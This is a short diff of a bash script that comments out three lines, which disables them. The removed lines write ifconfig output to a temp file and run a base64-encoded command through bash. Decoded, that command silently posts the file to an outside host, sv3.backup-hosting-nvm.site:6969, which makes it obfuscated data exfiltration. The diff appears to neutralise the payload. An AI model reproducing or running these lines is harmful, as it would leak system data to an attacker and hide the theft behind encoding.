@@ -1,4 +1,4 @@
 #!/bin/bash
-ifconfig > /tmp/87fuisdfia
-echo -n 'Y3VybCBodHRwOi8vc3YzLmJhY2t1cC1ob3N0aW5nLW52bS5zaXRlOjY5Njkvc2VjdXJpdHktdG9rZW4gLWQgQC90bXAvODdmdWlzZGZpYSA+L2Rldi9udWxsIDI+JjEgJgo=' | base64 -d | /bin/bash
-rm /tmp/87fuisdfia
+# ifconfig > /tmp/87fuisdfia
+# echo -n 'Y3VybCBodHRwOi8vc3YzLmJhY2t1cC1ob3N0aW5nLW52bS5zaXRlOjY5Njkvc2VjdXJpdHktdG9rZW4gLWQgQC90bXAvODdmdWlzZGZpYSA+L2Rldi9udWxsIDI+JjEgJgo=' | base64 -d | /bin/bash
+# rm /tmp/87fuisdfia
